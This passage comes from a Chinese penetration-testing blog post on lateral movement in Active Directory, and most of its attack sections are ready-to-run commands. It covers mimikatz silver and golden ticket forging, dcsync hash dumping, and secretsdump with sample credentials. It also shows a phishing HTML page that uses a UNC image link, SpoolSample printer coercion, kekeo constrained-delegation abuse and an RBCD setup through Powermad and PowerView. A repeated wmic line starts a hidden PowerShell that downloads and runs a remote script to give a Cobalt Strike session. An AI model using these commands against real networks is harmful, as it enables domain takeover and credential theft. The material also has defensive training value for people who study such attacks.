+<li><p>进行PTT之后，就可以进行横向移动横向移动方式很多。Wmic，也可以使用CS的自带工具，横向的时候注意杀软，尽量不要使用（PSEXEC,SMBEXEC,WICEXC ）因为这些集成的工具会有一些落地行为和多个协议认证行为，容易被检测</p>
+</li>
+</ol>
+<p><strong>工作组机器下的黄金票据制作和CS上线</strong></p>
+<p>1、修改DNS或者HOST文件，如果在不同域的情况下需要修改&#96;</p>
+<pre class="language-none"><code class="language-none">netsh interface ipv4 add dns 网口名字 DNS   不建议，因为实战会掉线
+
+echo [域控IP] [域控] &gt;&gt; C:\Windows\System32\drivers\etc\hosts
+echo 192.168.41.10 dc.test.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre>
+
+<p>2、获取伪造TGT的其他条件【域SID】【域名】</p>
+<p>3、横向移动</p>
+<h1 id="白银票据-SILVER-TICKET"><a href="#白银票据-SILVER-TICKET" class="headerlink" title="白银票据(SILVER TICKET)"></a>白银票据(SILVER TICKET)</h1><p>白银票据就伪造ST票据， kerberoasting是破解ST票据中的服务用户hash值，有以下区别</p>
+<p>白银票据：伪造的ST使用的是机器用户的Hash值</p>
+<p>Kerberoasting:破解的是ST的域用户的hash值</p>
+<p><strong>白银票据利用的条件</strong></p>
+<pre class="language-none"><code class="language-none">1.域名
+2.域sid
+3.目标服务器名(域名)
+4.可利用的服务
+5. 目标机器用户的NTLM-HASH
+6.需要伪造的用户名</code></pre>
+
+<p><strong>HAHS值获取</strong></p>
+<p>1、如果有域中的管理员账号可以使用dcsync读取</p>
+<pre class="language-none"><code class="language-none">lsddump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</code></pre>
+
+<p>2、如果通过枚举出来一个域中的管理员用户，可以使用如下的命令</p>
+<pre class="language-none"><code class="language-none">secretsdump.exe 域名&#x2F;[账号]:密码@IP
+secretsdump.exe test.local&#x2F;administrator:password@192.168.235.138</code></pre>
+
+<p><strong>白银票据伪造常用服务</strong></p>
+<pre class="language-none"><code class="language-none">1、CIFS
+在windows主机之间进行网络文件共享是通过使用微软公司自己的CIFS服务实现的
+
+2、伪造LDAP服务权限
+可以实现ldap查询，或者执行dcsync 
+
+3、host服务
+可以实现计划任务等</code></pre>
+
+<p><strong>制作方式</strong></p>
+<pre class="language-none"><code class="language-none">kerberos::golden &#x2F;domain:域名 &#x2F;sid:SID &#x2F;target:目标机器 &#x2F;service:服务名 &#x2F;rc4:NTLM-HASH &#x2F;user:[伪造的用户]&#x2F;ptt
+
+kerberos::golden &#x2F;domain:test.local &#x2F;sid:SID &#x2F;target:dc.test.local &#x2F;service:LDAP &#x2F;rc4:NTLM-HASH &#x2F;user:administrator&#x2F;ptt</code></pre>
+
+<p><strong>CS上线</strong></p>
+<p>1、检查电脑是否加入域,加入域直接可以使用白银票据</p>
+<p>2、查询白银票据的使用条件。伪造ldap使用mimikatz进行生成和传递</p>
+<p>3、通过dcsync查询域控上的hash值</p>
+<p>4、制作金票，或者进行pthptkptt等认证然后进行横向移动</p>
+<pre class="language-none"><code class="language-none">wmic &#x2F;NODE:IP PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#39;ps 脚本地址&#39;))\&quot;&quot;</code></pre>
+
+<p><strong>工作组上线</strong></p>
+<p>在工作组中的机器使用白银票据的时候需要注意如下的问题</p>
+<p>1、工作组机器的DNS必须修改成域控的IP(主要是工作组中的机器需要ping通域名)</p>
+<p>2、如果不修改DNS，可以修改本地的HOST文件，将域名执行对应的IP地址</p>
+<p>步骤</p>
+<p>1、检查机器是否加入了域</p>
+<p>2、修改DNS或者HOST文件，如果在ping不同域名的情况下需要修改</p>
+<pre class="language-none"><code class="language-none">echo [域控IP] [域控] &gt;&gt; C:\Windows\System32\drivers\etc\hosts
+echo 192.168.41.10 dc.test.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></pre>
+
+<p>3、查询白银票据的使用条件。伪造ldap使用mimikatz进行生成和传递</p>
+<p>4、通过dcsync查询域控上的hash值</p>
+<p>5、制作金票，或者进行pthptkptt等认证然后进行横向移动</p>
+<pre class="language-none"><code class="language-none">wmic &#x2F;NODE:IP PROCESS call create &quot;powershell.exe -nop -w hidden -c \&quot;IEX((new-object net.webclient).downloadstring(&#39;ps 脚本地址&#39;))\&quot;&quot;</code></pre>
+
+
+
+<h1 id="委派"><a href="#委派" class="headerlink" title="委派"></a>委派</h1><h2 id="非约束性委派"><a href="#非约束性委派" class="headerlink" title="非约束性委派"></a>非约束性委派</h2><blockquote>
+<p>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p>
+</blockquote>
+<p><strong>利用：</strong></p>
+<pre class="language-none"><code class="language-none">1、管理员主动访问被配置了非约束性委派的机器
+2、管理员被动访问被配置了非约束性委派的机器（结合漏洞即刻触发）</code></pre>
+
+<p>非约束性委派设置在域控上，设置的对象分为两种</p>
+<pre class="language-none"><code class="language-none">1、机器账号
+2、注册了SPN的域用户</code></pre>
+
+<p>配置了非约束性委派的机器，一旦访问该机器，TGT就会被缓存在lsass进程的内存中，通过klist是不能查看的，必须查看内存</p>
+<p><strong>查看：</strong></p>
+<pre class="language-none"><code class="language-none">privilege::debug
+mimikatz sekurlsa::tickets  查看票据信息
+mimikatz sekurlsa::tickets &#x2F;export   导出票据</code></pre>
+
+<p><strong>注意</strong></p>
+<pre class="language-none"><code class="language-none">1、域控是默认配置了非约束性委派的（跨域攻击可以用到）
+
+2、配置的非约束性委派最好是机器用户容易触发</code></pre>
+
+<p><strong>查询配置非约束性委派</strong></p>
+<p>1、通过ADFIND进行查询，如果是工作组机器需要提供用域名和密码，如果是用域用户就不需要提供</p>
+<pre class="language-none"><code class="language-none">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))“ -dn</code></pre>
+
+<p>2、查询域用户（配置了SPN）配置了非约束性委派</p>
+<pre class="language-none"><code class="language-none">AdFind.exe -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; -dn</code></pre>
+
+<p>工具使用：</p>
+<p>Powershell下的命令</p>
+<pre class="language-none"><code class="language-none">Import-Module PowerView.ps1
+
+Get-NetComputer –unconstrained | select dnshostname, samaccountname</code></pre>
+
+<p>CS下的命令</p>
+<pre class="language-none"><code class="language-none">powershell-import PowerView.ps1
+
+powershell Get-NetComputer –unconstrained | select dnshostname, samaccountname</code></pre>
+
+<p><strong>钓鱼方式进行委派攻击</strong></p>
+<p>1、诱导管理员通过kerberos访问被控机器（诱导管理员访问借助了windows特性会</p>
+<p>用当前账号密码进行认证的特性）</p>
+<p>钓鱼链接</p>
+<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///\\192.168.175.141\2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
+
+<p>2、在配置了非约束性委派的机器上进行导出内存票据（需要提权到最高权限才行）</p>
+<pre class="language-none"><code class="language-none">mimikatz sekurlsa::tickets &#x2F;export</code></pre>
+
+<p>3、导出的票据然后通过PTT，进行访问域控</p>
+<pre class="language-none"><code class="language-none">mimikatz kerberos::ptt xxx.kirbi</code></pre>
+
+<p>4、使用横向移动命令进行CS上线（WMI WINRM 计划任务</p>
+<p>服务 DCOM psexec smbexec wmicexec atexec……）</p>
+<p><strong>利用打印机漏洞进行委派攻击</strong></p>
+<p>条件：</p>
+<pre class="language-none"><code class="language-none">域控开启打印机
+域用户
+administrator权限或者system</code></pre>
+
+
+
+<p>主动和被动的区别</p>
+<p>1、主动：拿到域用户的hash值，进行PTT攻击</p>
+<p>2、被动：拿到机器用户的Hash，可以进行dcsync，接着进行PTT攻击</p>
+<p>1、首先利用Rubeus在本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录信息</p>
+<pre class="language-none"><code class="language-none">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:DC$</code></pre>
+
+<p>2、再利用SpoolSample强制域控打印机回连，需在域用户进程上执行</p>
+<pre class="language-none"><code class="language-none">SpoolSample.exe DC [SVC]  这里的SVN是指目标服务器的 Share Name（共享名称）</code></pre>
+
+<p>3、Rubeus监听到票据（这里的TGT票据是DC$的票据）</p>
+<p>4、根据之前的Dcsync技术，域控的机器用户是有权限执行Dcsysnc的</p>
+<pre class="language-none"><code class="language-none">Rubeus.exe ptt &#x2F;ticket:票据(导入TGT票据)</code></pre>
+
+<p>5、执行mimikatz</p>
+<pre class="language-none"><code class="language-none">lsadump::dcsync &#x2F;all &#x2F;csv</code></pre>
+
+<p>6、然后制作金票、PTT PTH 认证接着采用横向的方式进行横向移动</p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><blockquote>
+<p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。</p>
+<p>约束性委派是对委派的机器作了约束，被委派的机器只能访问设定好机器的服务</p>
+</blockquote>
+<p><strong>查询配置约束委派的账户</strong></p>
+<ol>
+<li>Adfind</li>
+</ol>
+<pre class="language-none"><code class="language-none">AdFind -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; msds-allowedtodelegateto</code></pre>
+
+<ol start="2">
+<li>PowerView.ps1脚本</li>
+</ol>
+<pre class="language-none"><code class="language-none">Get-DomainUser -TrustedToAuth -domain test.local -Properties distinguishedname,msds</code></pre>
+
+<p><strong>CS上线</strong></p>
+<ol>
+<li><p>查询</p>
+</li>
+<li><p>抓取该设置约束委派电脑的哈希</p>
+</li>
+<li><p>申请自己的的票据</p>
+</li>
+</ol>
+<pre class="language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:win7 &#x2F;domain:test.local &#x2F;password:ZHou2580 &#x2F;ticket:admin.kirbi&quot; &quot;exit&quot;
+
+哈希值获取票据：
+kekeo &quot;tgt::ask &#x2F;user:webadmin &#x2F;domain:god.org &#x2F;NTLM:518b98ad4178a53695dc997aa02d455c &#x2F;ticket:administrator.kirbi&quot; &quot;exit&quot;</code></pre>
+
+<ol start="4">
+<li>利用用户票据获取域控票据</li>
+</ol>
+<pre class="language-none"><code class="language-none">kekeo &quot;tgs::s4u &#x2F;tgt:TGT_win7@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi &#x2F;user:admin@test.local &#x2F;service:cifs&#x2F;DC&quot; &quot;exit&quot;</code></pre>
+
+<ol start="5">
+<li>导入票据到内存</li>
+</ol>
+<pre class="language-none"><code class="language-none">mimikatz kerberos::ptt TGS_admin@test.local@TEST.LOCAL_win7@TEST.LOCAL.kirbi</code></pre>
+
+<ol start="6">
+<li>连接通讯域控</li>
+</ol>
+<pre class="language-none"><code class="language-none">shell dir \\DC\c$</code></pre>
+
+
+
+<h2 id="基于资源的约束性委派-RBCD"><a href="#基于资源的约束性委派-RBCD" class="headerlink" title="基于资源的约束性委派(RBCD)"></a>基于资源的约束性委派(RBCD)</h2><blockquote>
+<p>于资源的约束性委派基于资源的约束性委派不需要通过域管理员进行修改，而是将设置属性的权限给了服务资源本身</p>
+</blockquote>
+<p>约束性委派委派机器在域控上对进行设置的，基于资源的约束性委派是通过文件系统自己设置的</p>
+<p><strong>设置RBCD</strong></p>
+<p>条件：</p>
+<pre class="language-none"><code class="language-none">1. 机器加入域的时候使用的账户
+2. 主机的机器用户(system)
+3. 域管(Administrator)
+4. Account Operator组中的成员</code></pre>
+
+
+
+<p><strong>域账号控制域内主机上线</strong></p>
+<ol>
+<li>查看哪些主机是同一个计算机加入的</li>
+</ol>
+<pre class="language-none"><code class="language-none">AdFind.exe -h 192.168.235.138 -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;objectClass&#x3D;computer&quot; mS-DS-CreatorSID   同一主机加入的SID值相同</code></pre>
+
+<ol start="2">
+<li>查看SID对应的是哪个计算机</li>
+</ol>
+<pre class="language-none"><code class="language-none">AdFind.exe -sc adsid:SID -dn   查询的用户可设置RBCD</code></pre>
+
+<p>同一账户可多个电脑登录，域控会多出计算机</p>
+<p>查询对应两个可能</p>
+<p>1、 当前登录不是多账户登录的计算机，就需要用密码喷洒等获取到其账号密码，使用lsrunas.exe进行权限切换</p>
+<p>2、当前登录是多账户登录的计算机，直接配置RBCD</p>
+<p>创建机器账户</p>
+<pre class="language-none"><code class="language-none">Set-ExecutionPolicy Bypass -Scope Process
+
+Import-Module .\Powermad.ps1
+
+New-MachineAccount -MachineAccount [serviceA] -Password $(ConvertTo-SecureString &quot;[密码]&quot; -AsPlainText -Force)</code></pre>
+
+<p>获取添加机器账户的SID值</p>
+<pre class="language-none"><code class="language-none">Import-Module .\PowerView.ps1
+
+Get-NetComputer [用户名] -Properties objectsid</code></pre>
+
+<p>设置修改属性</p>
+<pre class="language-none"><code class="language-none">Set-ExecutionPolicy Bypass -Scope Process
+import-module .\powerview.ps1
+
+$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;[SID])&quot;;$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer [要攻击的用户]| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose
+#攻击用户是同一个计算机加入的</code></pre>
+
+<p>验证是否添加成功</p>
+<pre class="language-none"><code class="language-none">Get-DomainComputer [攻击的用户名] -Properties msds-allowedtoactonbehalfofotheridentity</code></pre>
+
+<p>要清除设置可用</p>
+<pre class="language-none"><code class="language-none">Set-DomainObject [攻击的用户名] -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose</code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Doramer</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://doramer.github.io/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BA%8C)/">https://doramer.github.io/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%BA%8C)/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Doramer</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                    <span class="chip bg-color">内网渗透</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="汇编学习">
+                        
+                        <span class="card-title">汇编学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" class="post-category">
+                                    二进制
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%B1%87%E7%BC%96/">
+                        <span class="chip bg-color">汇编</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%80)/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="横向移动(一)">
+                        
+                        <span class="card-title">横向移动(一)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-11
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024</span>
+            
+            <a href="/about" target="_blank">Doramer</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">49.5k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2657100414@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2657100414" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2657100414" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
